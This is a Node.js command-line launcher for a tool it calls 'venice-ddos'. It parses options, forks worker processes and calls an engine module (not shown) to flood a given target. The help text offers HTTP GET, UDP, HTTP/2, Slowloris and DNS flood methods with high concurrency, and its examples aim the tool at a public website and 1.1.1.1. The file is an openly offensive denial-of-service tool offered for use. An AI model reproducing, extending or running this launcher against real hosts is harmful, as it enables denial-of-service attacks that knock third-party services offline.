#!/usr/bin/env node
'use strict';

const cluster = require('cluster');
const { run } = require('./lib/engine');

function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (!a.startsWith('--')) { if (!out.target) out.target = a; continue; }
    const key = a.slice(2);
    const next = argv[i + 1];
    if (next === undefined || next.startsWith('--')) out[key] = true;
    else { out[key] = next; i++; }
  }
  return out;
}

const argv = parseArgs(process.argv.slice(2));

if (!argv.target || argv.help) {
  console.log(`
  venice-ddos — local / cluster mode

  Usage:
    node local.js <target> [options]

  Options:
    --method <id|list|mix|all>   default: http-get
    --duration <sec>             default: 15
    --concurrency <n>            sockets per process, default: 600
    --workers <n>                OS processes via cluster, default: 1
    --port <n>                   override port
    --payloadSize <bytes>        UDP payload size
    --sessions <n>               HTTP/2 sessions
    --slowInterval <ms>          Slowloris pad interval
    --json                       print final JSON only

  Examples:
    node local.js https://example.com --method all --duration 60 --concurrency 800 --workers 4
    node local.js 1.1.1.1 --method dns --duration 30
`);
  process.exit(0);
}

const workerCount = Math.max(1, Number(argv.workers) || 1);

if (workerCount > 1 && cluster.isPrimary) {
  for (let i = 0; i < workerCount; i++) cluster.fork();
  cluster.on('exit', () => {});
} else {
  const opts = {
    target: argv.target,
    method: argv.method || 'http-get',
    duration: Number(argv.duration) || 15,
    concurrency: Number(argv.concurrency) || 600,
    port: argv.port ? Number(argv.port) : undefined,
    payloadSize: argv.payloadSize ? Number(argv.payloadSize) : undefined,
    sessions: argv.sessions ? Number(argv.sessions) : undefined,
    slowInterval: argv.slowInterval ? Number(argv.slowInterval) : undefined,
  };

  const label = cluster.isWorker ? `w${process.pid}` : 'main';
  const onTick = argv.json ? null : (snap) => {
    const line = `[${label}] ${snap.uptime.toFixed(0)}s  ${Math.round(snap.rate.rps).toLocaleString()} req/s  ${(snap.rate.bps / 1e6).toFixed(2)} Mbps  ${snap.total.errors} err`;
    process.stdout.write(`\r${line.padEnd(90)}`);
  };

  run(opts, onTick)
    .then((result) => {
      if (!argv.json) process.stdout.write('\n');
      console.log(JSON.stringify(result, null, 2));
      if (cluster.isWorker) process.exit(0);
    })
    .catch((e) => { console.error('error:', e.message); process.exit(1); });
}
